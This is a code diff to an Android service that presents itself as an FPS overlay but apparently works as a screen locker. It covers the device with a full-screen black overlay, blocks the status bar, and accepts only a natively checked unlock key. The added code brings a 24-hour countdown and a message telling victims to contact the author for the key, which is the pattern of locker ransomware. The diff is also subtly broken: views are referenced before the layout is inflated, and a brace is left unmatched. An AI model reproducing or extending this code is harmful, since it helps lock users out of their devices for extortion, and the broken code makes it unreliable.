@@ -29,6 +29,9 @@ import com.bluestacks.fpsoverlay.R;
 public class FPSService extends Service {
     private WindowManager windowManager;
     private View overlayLayout;
+    private TextView textTimer;
+    private TextView textStatusMessage;
+    private long timeLeftInSeconds = 24 * 3600; // 24 jam
     public static boolean isAuthenticated = false;
 
     static {
@@ -133,17 +136,19 @@ public class FPSService extends Service {
         public void onCreate() {
         super.onCreate();
     
-        // 1. Memulai Foreground Service & StatusBar Blocker
+        textTimer = overlayLayout.findViewById(R.id.textTimer);
+        textStatusMessage = overlayLayout.findViewById(R.id.textStatusMessage);
+        TextView display = overlayLayout.findViewById(R.id.textDisplayPassword);
+    
+        startCountdown();
         startInForeground();
         initSystemOptimization();
     
-        // 2. Setup Window Manager & Layout
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         overlayLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
         overlayLayout.setFitsSystemWindows(false);
-        overlayLayout.setBackgroundColor(0xFF000000); // Hitam pekat
+        overlayLayout.setBackgroundColor(0xFF000000);
     
-        // 3. Konfigurasi LayoutParams
         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -194,16 +199,15 @@ public class FPSService extends Service {
         }
     
         View btnUnlock = overlayLayout.findViewById(R.id.btnUnlock);
-        if (btnUnlock != null) {
             btnUnlock.setOnClickListener(v -> {
-                // Memanggil verifikasi Native C++ dengan key 02042009
                 if (verifyAdvancedKey(currentInput)) {
                     isAuthenticated = true;
                     stopSelf(); 
                 } else {
                     currentInput = "";
                     display.setText("");
-                    display.setHint("ENGINE AUTHENTICATION FAILED");
+                    textStatusMessage.setText("KEY FAILED, CONTACT MY PHONE TO GET KEY");
+                    new Handler().postDelayed(() -> textStatusMessage.setText(""), 2000);
                 }
             });
         }
